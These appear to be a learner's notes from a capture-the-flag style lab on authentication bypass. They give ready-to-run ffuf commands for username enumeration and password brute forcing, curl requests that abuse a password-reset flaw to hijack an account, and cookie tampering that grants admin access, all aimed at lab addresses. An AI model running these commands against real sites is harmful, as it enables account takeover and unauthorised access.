# Authentication bypass
- different ways website authentication can be bypassed, defeated or broken - ends in leaks of customer data

### Username enumuration
- using ffuf to find the already signed up usernames from the commonly used usernames list
- when an user already exists, it retusn "username already exists"
- ffuf allows passing regex to check the return response form the website and find the matched usernames
> ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.39.132/customers/signup -mr "username already exists"

- w- wprd list
- x http request
- d - data we are going to send
- FUZZ - its where ffuf replaces the words and do the automation
- H - to pass additonal header information
- u - the url we are going to make the request
- mr - text on the page we are looking for to validate we found the username
- 
> The ffuf tool and wordlist come pre-installed on the AttackBox or can be installed locally by downloading it from https://github.com/ffuf/ffuf.


 ### Brute fource using FFUF
 > ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.135.246/customers/login -fc 200


### Logic flaw
           
user@tryhackme$ curl 'http://10.10.135.246/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'

> curl 'http://10.10.135.246/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'


### Cookie tampering

plain text cookie:
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/

> curl http://10.10.135.246/cookie-test
> not logged in

> curl -H "Cookie: logged_in=true; admin=false" http://10.10.135.246/cookie-test
> loggedin as a user

> curl -H "Cookie: logged_in=true; admin=true" http://10.10.135.246/cookie-test
> Logged in as admin


**Hashing**

> https://crackstation.net/ keep databases of billions of hashes and their original strings.

**Encoding**
- convert binary data to human readable data
- support ASCII characters

- base32 - converts binary data to characters A-Z and 2-7
- base64 - convert binary data to characters A-Z, a-z, 0-9, +, / and the equal sign for padding

- 

        
